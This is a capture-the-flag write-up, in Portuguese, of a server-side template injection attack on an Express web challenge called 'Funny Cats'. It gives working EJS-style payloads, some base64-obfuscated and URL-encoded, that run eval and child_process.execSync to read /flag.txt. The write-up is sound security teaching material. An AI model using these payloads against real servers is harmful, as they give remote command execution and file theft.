# **WEB**

**Autor**: Hakal  
**Desafio**: Funny Cats  
**Nível**: Médio  

---

## **1. Introdução**

Neste write-up, abordaremos uma exploração que se aproveita da vulnerabilidade de Server-Side Template Injection (SSTI) em um servidor Express. O objetivo desta exploração é localizar a flag escondida no arquivo `/flag.txt` no servidor alvo. A exploração será realizada através de injeções de template, que permitem a execução de código arbitrário no servidor.

---

## **2. Análise do Código Vulnerável**

O site exibe imagens de gatos e permite a inserção de um nome de gato através de uma URL, como no exemplo: `https://funny-cats.chapeudepalhahacker.club/gato?name=Alfredo`. A vulnerabilidade SSTI ocorre quando a entrada do usuário é processada sem a devida sanitização, permitindo a execução de código no servidor.

---

## **3. Exploração da SSTI**

O objetivo da exploração é injetar código malicioso que nos permita ler o conteúdo do arquivo `/flag.txt`.

### **Passo 1: Demonstração de Injeção de Template Básica**

Injetamos um código simples que realiza uma multiplicação. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor. Isso também ajuda a evitar que o código seja bloqueado ou modificado por filtros de segurança.

**Payload:**

```plaintext
<%= 7*7 %>
```

**URL Encoded:**

Utilizamos o [CyberChef](https://gchq.github.io/CyberChef) para o payload em URL. O resultado é:

```plaintext
%3C%25%3D%207*7%20%25%3E
```

**URL Completa:**

Injetamos o payload na URL completa através do source code:

```plaintext
view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%207*7%20%25%3E
```

**Saída:**

![Resultado da Injeção Básica](1.png)

### **Passo 2: Identificação do Sistema Operacional**

Para identificar o sistema operacional do servidor, utilizamos a função `eval` para decodificar um buffer em base64 que executa o comando `os.platform()`. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor.

**Payload:**

```plaintext
<%= '- Sistema Operacional: ' %><%=eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk=', 'base64').toString())%><%= '' %>
```

**URL Encoded:**

Codificamos o payload em URL novamente, e o resultado é:

```plaintext
%3C%25%3D%20'- Sistema Operacional: '%20%25%3E%3C%25%3Deval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk%3D',%20'base64').toString())%25%3E%3C%25%3D%20''%20%25%3E
```

**URL Completa:**

Injetamos o payload na URL completa através do source code:

```plaintext
view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%20'- Sistema Operacional: '%20%25%3E%3C%25%3Deval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk%3D',%20'base64').toString())%25%3E%3C%25%3D%20''%20%25%3E
```

**Saída:**

![Identificação do Sistema Operacional](2.png)

### **Passo 3: Leitura do Conteúdo de /flag.txt**

Para ler o conteúdo do arquivo `/flag.txt`, utilizamos a função `execSync` do módulo `child_process` para executar o comando `cat /flag.txt`. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor.

**Payload:**

```plaintext
<%= '- ' %><%= global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo=', 'base64').toString()) %><%= '' %>
```

**URL Encoded:**

Novamente encodamos para URL. O resultado é:

```plaintext
%3C%25%3D%20'- '%20%25%3E%3C%25%3D%20global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo%3D',%20'base64').toString())%20%25%3E%3C%25%3D%20''%20%25%3E
```

**URL Completa:**

Injetamos o payload na URL completa através do source code:

```plaintext
view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%20'- '%20%25%3E%3C%25%3D%20global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo%3D',%20'base64').toString())%20%25%3E%3C%25%3D%20''%20%25%3E
```

**Saída:**

![Leitura do Conteúdo de /flag.txt](3.png)

---

## **4. Conclusão**

Este desafio envolveu o processo de:

1. Identificação da vulnerabilidade de SSTI no servidor Express.
2. Injeção de código malicioso para identificar o sistema operacional do servidor.
3. Execução de comandos no servidor para ler o conteúdo do arquivo `/flag.txt` e obter a flag.

Com o conhecimento sobre a vulnerabilidade SSTI e a necessidade de URL encoding, foi possível realizar a exploração com sucesso e alcançar o objetivo final.

---
